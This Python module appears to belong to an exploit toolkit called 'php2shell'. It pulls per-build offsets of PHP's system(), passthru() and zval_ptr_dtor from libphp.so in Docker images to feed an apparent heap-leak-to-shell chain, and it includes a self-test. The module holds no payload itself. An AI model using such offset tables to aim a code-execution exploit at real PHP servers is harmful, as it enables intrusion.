"""Per-build offset extraction (G2) — docker image -> profile row.

Offsets are ASLR-independent; identity is the `libphp.so` SHA-256 / GNU
build-id, not the image tag (distro backports keep the tag). This module reads
the symbols out of a stock image with `readelf` and writes a normalized row
into `profiles/*.json`, which `php2shell/profiles.py` then serves to the chain.

It deliberately does **not** calibrate heap geometry: that is
`php2shell/calibrate.py`. A row written here is "offsets known", not "chain
validated" (`validated: false`).
"""

from __future__ import annotations

import argparse
import json
import re
import subprocess
import sys
from pathlib import Path

from . import profiles

ROOT = Path(__file__).resolve().parent.parent
DEFAULT_OUT = profiles.PROFILE_DIR / "offsets.json"

LIBPHP_CANDIDATES = (
    "/usr/lib/apache2/modules/libphp.so",
    "/usr/lib/apache2/modules/libphp8.so",
)
SYMBOLS = ("zval_ptr_dtor", "zif_system", "zif_passthru")

_SYM_RE = re.compile(
    r"^\s*\d+:\s*([0-9a-fA-F]+)\s+\d+\s+\w+\s+\w+\s+\w+\s+\w+\s+(\S+)\s*$"
)
_BUILDID_RE = re.compile(r"Build ID:\s*([0-9a-fA-F]+)")


class DockerError(RuntimeError):
    pass


def _run(argv, timeout=120):
    try:
        return subprocess.run(argv, capture_output=True, text=True,
                              timeout=timeout, check=True).stdout
    except FileNotFoundError as exc:
        raise DockerError("docker is not installed") from exc
    except subprocess.CalledProcessError as exc:
        raise DockerError(f"{' '.join(argv)} failed: {exc.stderr.strip()}") from exc


def image_arch(image, platform=None):
    fmt = "{{.Architecture}}"
    argv = ["docker", "image", "inspect", "--format", fmt, image]
    return _run(argv).strip()


def _php_version(image, platform=None):
    argv = ["docker", "run", "--rm"]
    if platform:
        argv += ["--platform", platform]
    argv += [image, "php", "-r", "echo PHP_VERSION;"]
    return _run(argv).strip()


def extract(image, platform=None, codename="bookworm"):
    """Return a normalized profile dict for an apache/mod_php image."""
    arch = image_arch(image, platform)
    argv = ["docker", "run", "--rm"]
    if platform:
        argv += ["--platform", platform]
    script = (
        "set -e; "
        "L=''; for c in " + " ".join(LIBPHP_CANDIDATES) + "; "
        "do [ -f \"$c\" ] && L=\"$c\" && break; done; "
        "[ -n \"$L\" ] || { echo 'NO_LIBPHP'; exit 3; }; "
        "echo \"LIBPHP=$L\"; "
        "sha256sum \"$L\"; "
        "readelf -n \"$L\" | grep -A1 'Build ID' | tail -1; "
        "readelf -sW \"$L\" | grep -E ' (zval_ptr_dtor|zif_system|zif_passthru)$'"
    )
    argv += [image, "sh", "-c", script]
    out = _run(argv, timeout=300)

    path = None
    sha = None
    build_id = None
    symbols = {}
    for line in out.splitlines():
        line = line.strip()
        if line.startswith("LIBPHP="):
            path = line.split("=", 1)[1]
            continue
        m = _BUILDID_RE.search(line)
        if m:
            build_id = m.group(1)
            continue
        parts = line.split()
        if len(parts) == 2 and re.fullmatch(r"[0-9a-f]{64}", parts[0]):
            sha = parts[0]
            continue
        m = _SYM_RE.match(line)
        if m and m.group(2) in SYMBOLS:
            symbols[m.group(2)] = int(m.group(1), 16)

    missing = [s for s in ("zval_ptr_dtor", "zif_system") if s not in symbols]
    if missing:
        raise DockerError(f"{image}: readelf did not expose {missing} "
                          f"(local symbol? see docs/OFFSETS.md)")

    php_version = _php_version(image, platform)
    norm_arch = "aarch64" if arch in ("arm64", "aarch64") else "x86_64"
    leak_bias = profiles.ARCH_DEFAULTS[norm_arch]["leak_bias"]
    profile_id = f"php-{php_version}-{codename}-{norm_arch}"
    return {
        "id": profile_id,
        "image": image,
        "php_version": php_version,
        "arch": norm_arch,
        "codename": codename,
        "libphp_path": path,
        "libphp_sha256": sha,
        "build_id": build_id,
        "zval_ptr_dtor": symbols["zval_ptr_dtor"],
        "zif_system": symbols["zif_system"],
        "zif_passthru": symbols.get("zif_passthru"),
        # The leaked qword is the symbol on most builds; on a few it carries a
        # small bias. Record both; the leak parser picks the page-aligned one.
        "leak_dtor": symbols["zval_ptr_dtor"],
        "leak_dtor_biased": symbols["zval_ptr_dtor"] + leak_bias,
        "validated": False,
    }


def merge(rows, path=DEFAULT_OUT):
    """Merge rows into an offsets JSON file (per-profile id)."""
    path = Path(path)
    data = {"profiles": {}}
    if path.is_file():
        try:
            existing = json.loads(path.read_text(encoding="utf-8"))
            data["profiles"] = existing.get("profiles", existing)
        except ValueError:
            pass
    for row in rows:
        data["profiles"][row["id"]] = row
    path.parent.mkdir(parents=True, exist_ok=True)
    path.write_text(json.dumps(data, indent=2, sort_keys=True) + "\n",
                    encoding="utf-8")
    return path


def build_rows(images, platform=None, codename="bookworm"):
    return [extract(image, platform=platform, codename=codename)
            for image in images]


# --------------------------------------------------------------------------
# Offline checks / self-test
# --------------------------------------------------------------------------
SAMPLE_READELF = """\
     5: 000000000042cd70   123 FUNC    GLOBAL DEFAULT   11 zif_system
     6: 000000000042cd80   123 FUNC    GLOBAL DEFAULT   11 zif_passthru
     7: 0000000000638120   456 FUNC    LOCAL  DEFAULT   11 zval_ptr_dtor
"""

SAMPLE_BUILDID = "    Build ID: b3525423deadbeef"


def parse_readelf(text):
    """Parse the readelf symbol/build-id output into a partial row."""
    symbols = {}
    build_id = None
    for line in text.splitlines():
        m = _BUILDID_RE.search(line)
        if m:
            build_id = m.group(1)
            continue
        m = _SYM_RE.match(line)
        if m and m.group(2) in SYMBOLS:
            symbols[m.group(2)] = int(m.group(1), 16)
    return build_id, symbols


def self_test():
    build_id, symbols = parse_readelf(SAMPLE_READELF + "\n" + SAMPLE_BUILDID)
    assert build_id == "b3525423deadbeef", build_id
    assert symbols == {"zif_system": 0x42CD70, "zif_passthru": 0x42CD80,
                       "zval_ptr_dtor": 0x638120}, symbols
    # The aarch64 leak bias must recover the documented leak_dtor.
    assert symbols["zval_ptr_dtor"] + profiles.ARCH_DEFAULTS["aarch64"]["leak_bias"] \
        == 0x63812B
    # A builtin row is load-bearing for the validated build, and an extracted
    # file row must not downgrade its validated flag.
    prof = profiles.find(php_version="8.4.26", arch="aarch64")
    assert prof is not None and prof["zif_system"] == 0x42CD70
    assert prof["validated"] is True
    assert profiles.for_arch("aarch64")["php_version"] == "8.4.26"
    return True


def main(argv=None):
    ap = argparse.ArgumentParser(description=__doc__)
    ap.add_argument("--image", action="append", default=[],
                    help="docker image tag (repeatable)")
    ap.add_argument("--platform", default=None,
                    help="docker --platform (e.g. linux/arm64)")
    ap.add_argument("--codename", default="bookworm")
    ap.add_argument("--out", default=str(DEFAULT_OUT))
    ap.add_argument("--write", action="store_true",
                    help="merge extracted rows into the profile file")
    ap.add_argument("--self-test", action="store_true")
    args = ap.parse_args(argv)

    if args.self_test:
        self_test()
        print("[ok] offsets self-test (parse, leak bias, builtin lookup)")
        return 0
    if not args.image:
        ap.error("give --image (repeatable) or --self-test")

    rows = build_rows(args.image, platform=args.platform, codename=args.codename)
    for row in rows:
        print(json.dumps(row, indent=2, sort_keys=True))
    if args.write:
        path = merge(rows, args.out)
        print(f"\n[ok] merged {len(rows)} row(s) into {path}")
    return 0


if __name__ == "__main__":
    sys.exit(main())
